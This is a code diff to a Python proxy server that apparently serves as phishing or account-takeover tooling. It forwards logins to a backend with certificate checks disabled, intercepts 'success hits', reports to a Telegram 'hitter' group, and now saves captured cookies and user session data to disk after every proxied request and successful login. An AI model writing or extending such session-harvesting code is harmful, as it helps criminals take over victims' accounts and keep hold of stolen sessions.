@@ -28,24 +28,65 @@ ADMIN_ID = "8766583877"
 # Rebranded Group
 HIT_GROUP = "@hitterlite"
 
+# Persist files
+COOKIE_FILE = os.path.join(STATIC_DIR, "cookies.txt")
+SESSION_FILE = os.path.join(STATIC_DIR, "session_state.json")
+
 # SSL context
 ssl_ctx = ssl.create_default_context()
 ssl_ctx.check_hostname = False
 ssl_ctx.verify_mode = ssl.CERT_NONE
 
-# Cookie jar for backend session
-cookie_jar = http.cookiejar.CookieJar()
+# Persistent Cookie Jar
+cookie_jar = http.cookiejar.LWPCookieJar(COOKIE_FILE)
+if os.path.exists(COOKIE_FILE):
+    try:
+        cookie_jar.load(ignore_discard=True, ignore_expires=True)
+        print(f"  [SESSION] Loaded cookies from {COOKIE_FILE}")
+    except:
+        pass
+
 opener = urllib.request.build_opener(
     urllib.request.HTTPCookieProcessor(cookie_jar),
     urllib.request.HTTPSHandler(context=ssl_ctx)
 )
 
-# OTP storage: {telegram_id: otp_code}
-otp_store = {}
-
 # Session storage: {telegram_id: user_data}
 sessions = {}
 current_session_user = None
+
+def save_session_state():
+    """Save user session and cookies to disk."""
+    global sessions, current_session_user
+    try:
+        # Save cookies
+        cookie_jar.save(ignore_discard=True, ignore_expires=True)
+        # Save session data
+        state = {
+            "sessions": sessions,
+            "current_session_user": current_session_user
+        }
+        with open(SESSION_FILE, "w") as f:
+            json.dump(state, f)
+    except Exception as e:
+        print(f"  [SESSION] Save failed: {e}")
+
+def load_session_state():
+    """Load user session from disk."""
+    global sessions, current_session_user
+    if os.path.exists(SESSION_FILE):
+        try:
+            with open(SESSION_FILE, "r") as f:
+                state = json.load(f)
+                sessions = state.get("sessions", {})
+                current_session_user = state.get("current_session_user")
+                if current_session_user:
+                    print(f"  [SESSION] Restored user: {current_session_user.get('firstName')}")
+        except:
+            pass
+
+# Load initial state
+load_session_state()
 
 
 def send_telegram_message(chat_id, text):
@@ -140,6 +181,9 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         try:
             resp = opener.open(req)
             resp_body = resp.read()
+            
+            # Save cookies after every proxy call
+            save_session_state()
             
             # --- SUCCESS HIT INTERCEPTION ---
             try:
@@ -266,6 +310,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 if data.get("success"):
                     current_session_user = data.get("user")
                     print(f"  [AUTH] Backend success for {current_session_user.get('firstName')}")
+                    save_session_state()
                 
                 self.send_response(resp.status)
                 for k, v in resp.getheaders():
@@ -339,6 +384,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             current_session_user = None
             # Clear cookies
             cookie_jar.clear()
+            save_session_state()
             self._send_json({"success": True, "message": "Logged out successfully"})
             print("  [AUTH] User logged out locally and cookies cleared.")
             return
